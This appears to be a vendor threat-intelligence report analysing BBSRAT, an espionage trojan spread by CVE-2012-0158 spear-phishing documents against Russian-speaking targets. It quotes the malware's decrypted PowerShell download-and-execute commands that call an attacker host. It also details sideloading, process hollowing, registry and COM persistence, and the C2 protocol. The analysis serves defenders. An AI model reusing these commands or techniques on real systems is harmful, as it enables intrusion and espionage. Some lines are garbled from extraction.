The attack was found to heavily rely on RTF exploits and at the time, thought\nto make use of the PlugX malware family.\nESET did not attribute the attacks to a particular attack group, but noted that the objective of the campaign was espionage and\n[general information stealing. Based on data collected from Palo Alto Networks AutoFocus threat intelligence, we discovered](https://www.paloaltonetworks.com/products/platforms/subscriptions/autofocus.html)\ncontinued operations of activity very similar to the Roaming Tiger attack campaign that began in the August 2015 timeframe, with a\nconcentration of attacks in late October and continuing into December.\nThe adversaries behind these attacks continued to target Russia and other Russian speaking nations using similar exploits and\nattack vectors. However, while the malware used in these new attacks uses similar infection mechanisms to PlugX, it is a\ncompletely new tool with its own specific behavior patterns and architecture. We have named this tool “BBSRAT.”\n#### Targeting and Infrastructure\nAs described in earlier reports on “Roaming Tiger”, the attack observed in August 2015 used weaponized exploit documents that\nleave Russian language decoy document files after infecting the system. The files exploit the well­known Microsoft Office\nvulnerability, CVE­2012­0158, to execute malicious code in order to take control of the targeted systems.\n\n\n-----\n\nFigure 1 Spear­phishing email delivering BBSRAT\nIn one case, the adversary impersonated an individual from the organization Vigstar, a Russian­based research organization in\ncharge of the development of satellite communications and special purpose wireless devices for the Russian Federation’s defense\nand security agencies. The targeted email address appeared to be a Gmail account associated with Vigstar as well, and was\nfound on a job board website for a job opening at Vigstar.\nThe rough translation of the body of the email is as follows:\n_I send you a “list of international exhibitions of military, civil and dual­purpose, conducted in 2015 on the territory of the Russian_\n_Federation and foreign states.” Waiting for your reply!_\nFigure 2 confirms that the decoy document that opens after the malware infects the system is indeed a list of international\nexhibitions that were conducted on Russian territory in 2015.\n\nFigure 2 Decoy document that is opened after the malicious document has infected the system\n\n\n-----\n\np g g p g, g [ ] g [ ] g y, p y\npublished C2 domains have significant overlap amongst the hashes and IPs while C2s for BBSRAT contain no overlap at all. This\nmay indicate that for the newer attack campaign using BBSRAT, the adversary may have deployed purpose­built variants and/or\ninfrastructure for each of the intended targets.\n\nFigure 3 Command and control infrastructure\n#### BBSRAT Malware Analysis\nDeployment Technique #1\nBBSRAT is typically packaged within a portable executable file, although in a few of the observed instances, a raw DLL was\ndiscovered to contain BBSRAT. When the dropper first runs, it will generate a path in the %TEMP% directory. The generated\nfilename is 10­16 uppercase alphabetic characters, and ends with a ‘.TMP’ file extension. The dropper will continue to write an\nembedded cab file in this location.\n\nFigure 4 Header of CAB file dropped by BBSRAT\nThe malware will proceed to create one of the following directories depending on what version of Microsoft Windows is running on\nthe target machine:\n%ALLUSERSPROFILE%\\SSONSVR\n%ALLUSERSPROFILE%\\Application Data\\SSONSVR\n\n\n-----\n\n_p_ _[_ _p__ _]_ _[_ __p_ _]_\nThis results in the following three files being written to the SSONSVR directory:\naclmain.sdb\npnipcn.dll\nssonsvr.exe\n[The ‘ssonsvr.exe’ file is a legitimate Citrix executable that will be used to sideload the malicious ‘pnipcn.dll’ file. The ‘aclmain.sdb’](https://attack.mitre.org/wiki/DLL_side-loading)\nfile contains code that will eventually be loaded by the ‘pnipcn.dll’ file.\n[The malware finally executes ‘ssonsvr.exe’ via a call to ShellExecuteW.](https://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx)\n\nFigure 5 Execution flow of dropper expanding CAB file\nWhen ‘ssonsvr.exe’ is executed, and the pnipcn.dll file is loaded, it will begin by identifying the path to msiexec.exe, by expanding\nthe following environment string:\n_%SystemRoot%\\System32\\msiexec.exe_\nIt will then spawn a suspended instance of msiexec.exe in a new process. The malware proceeds to load code from the\n‘aclmain.sdb’ file and performs process hollowing against this instance of msiexec.exe prior to resuming the process.\n\nFigure 6 Sideloading execution flow\nIn order to ensure persistence, the following registry key is written on the victim’s machine:\n_HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe : [path_to_ssonsvr.exe]_\nDeployment Technique #2\nIn the most recently observed sample of BBSRAT found in AutoFocus, the Trojan was deployed via a downloader that used the\n[Invoke­ReflectivePEInjection.ps1 script from the PowerSploit framework.](https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1)\nWhen the downloader executes, it will first decrypt the following two strings using a 5­byte XOR key of “\\x01\\x02\\x03\\x04\\x05”:\n_“powershell ­exec bypass ­c IEX (New­Object Net.WebClient).DownloadString(‘http://testzake[.]com/IR.ps1’);Invoke­_\n_ReflectivePEInjection ­PEUrl http://testzake[.]com/s.exe”_\n_“C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell ­exec bypass ­c IEX (New­Object_\n_Net.WebClient).DownloadString(‘http://testzake[.]com/IR.ps1’);Invoke­ReflectivePEInjection ­PEUrl http://testzake[.]com/s.exe”_\nThese strings are then sequentially executed via calls to WinExec. As we can see, the second command is specifically crafted to\nrun on 64­bit versions of Microsoft Windows. The commands in question will download an executable file and run it within the\ncontext of the powershell process.\nWhen the above commands are executed, the downloader will initially download the ‘IR.ps1’ powershell script from the specified\nURL:\n\nFigure 7 Downloader downloading the Invoke­ReflectivePEInjection PowerSploit script\nThis Powershell script appears to have been pulled directly from the PowerSploit framework, with no modifications made. The\nmalware then invokes this script with a URL that points to an additional executable file. This downloaded executable contains a\n\n\n-----\n\npp g\n_%SYSTEMROOT%\\web\\srvcl32.dll_\n_%APPDATA%\\web\\srvcl32.dll_\nAdditionally, the following registry keys are set depending on the system’s CPU architecture:\n_HKU\\Software\\Classes\\CLSID\\{42aedc87­2188­41fd­b9a3­0c966feabec1}\\InprocServer32\\ThreadingModel – “Both”_\n_HKU\\Software\\Classes\\CLSID\\{42aedc87­2188­41fd­b9a3­0c966feabec1}\\InprocServer32\\Default – [path_to_srvcl32.dll]_\n_HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB­AA52­4C3A­AB32­85FFC23AF9C1}\\InprocServer32\\ThreadingModel – “Both”_\n_HKLM\\SOFTWARE\\Classes\\CLSID\\{F3130CDB­AA52­4C3A­AB32­85FFC23AF9C1}\\InprocServer32\\Default –_\n\n_[path_to_srvcl32.dll]_\nThe COM object for {42aedc87­2188­41fd­b9a3­0c966feabec1} is specific to ‘MruPidlList’, while the COM object for {F3130CDB­\nAA52­4C3A­AB32­85FFC23AF9C1} is specific to ‘Microsoft WBEM New Event Subsystem’. This ensures that the DLL specified\n[will load when Microsoft Windows starts. It is a technique that was used by the ZeroAccess rootkit when it initially surfaced.](https://nakedsecurity.sophos.com/2012/06/06/zeroaccess-rootkit-usermode/)\nBBSRAT Execution\nAfter being loaded using one of the two techniques discussed, BBSRAT malware begins execution by loading the following\nlibraries at runtime:\nntdll.dll\nkernel32.dll\nuser32.dll\nadvapi32.dll\ngdi32.dll\nws2_32.dll\nshell32.dll\npsapi.dll\nSecur32.dll\nWtsApi32.dll\nNetapi32.dll\nVersion.dll\nCrypt32.dll\nWininet.dll\nThe following mutex is then created to ensure a single instance of BBSRAT is running at a given time:\n_Global\\GlobalAcProtectMutex_\nThroughout the execution of BBSRAT, it will dynamically load functions prior to calling them, as seen in the example below\ndemonstrating BBSRAT making a call to the WSAStartup function:\n\nFigure 8 BBSRAT calling WSAStartup function\nThe malware proceeds to parse the stored embedded network configuration and spawns a series of threads responsible for\nnetwork communication. This includes a series of HTTP or HTTPS requests, such as the following:\n_GET /bbs/1/forum.php?sid=1 HTTP/1.1_\n_Cookie: A46A8AA9­D7D6­43FB­959DC96E_\n_Content­Length:_\n_User­Agent: Mozilla/4.0 (compatible; Windows NT 5.1)_\n_Connection: Keep­Alive_\n_Host: transactiona[.]com_\n_Cache­Control: no­cache_\n_Accept: */*_\n_Content­Type:_\nIn the above example the ‘1’ used both in the URI and the sid GET parameter is a global incremental counter Every subsequent\n\n\n-----\n\n, q\n‘/bbs/[counter]/forum.php?sid=[counter]’ URL. All network data sent via POST requests uses a custom binary structure, as defined\nas the following:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nstruct network_header\n{\nDWORD random;\nDWORD hardcoded0;\nDWORD hardcoded1;\nDWORD command;\nDWORD length_of_compressed_data;\nDWORD length_of_decompressed_data;\nDWORD unknown2;\nBYTE compressed_data[];\n};\n\n\nThe compressed_data field is compressed using the common ZLIB compression algorithm. Additionally, in the event data is being\nsent via HTTP rather than HTTPS, the following additional encryption algorithm is applied to the POST data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\ndef decrypt(data):\nout = []\nfor x in data:\nt = (ord(x) - 23)\nt1 = (t ^ 62)\nt2 = (t1 + 23) & 0xFF\nout.append(chr(t2))\nreturn out\n\n\nThe following data structure holds the victim’s information that is uploaded by BBSRAT:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nstruct victim_information\n{\nDWORD static_value;\nDWORD major_version;\nDWORD minor_version;\nDWORD build_number;\nDWORD platform_id;\nDWORD default_locale;\nDWORD unknown;\nDWORD local_ip_address;\nDWORD running_as_64_bit;\nDWORD random;\nDWORD unknown2;\nDWORD struct_length;\nDWORD struct_with_not_used_length;\nDWORD struct_with_username_length;\nDWORD struct_with_group_length;\nDWORD unknown3;\nDWORD struct_with_hostname_length;\nWCHAR not_used[??];\nWCHAR username[??];\nWCHAR group[??];\nWCHAR hostname[??];\n};\n\n\nBBSRAT accepts many possible commands that the C2 server can provide. These commands are sent as a response to the GET\nbeacons that are continually requested via either HTTP or HTTPS.

Despite the fact that the information about these attackers has been public for\nover a year, including a listing of many of the command and control servers, they continue to reuse much of their exposed\nplaybook. We urge organizations to use the data from Unit 42 and other threat intelligence sources is paramount to proactively\nsecure themselves and prevent attacks.\n[WildFire properly classifies BBSRAT malware samples as malicious.
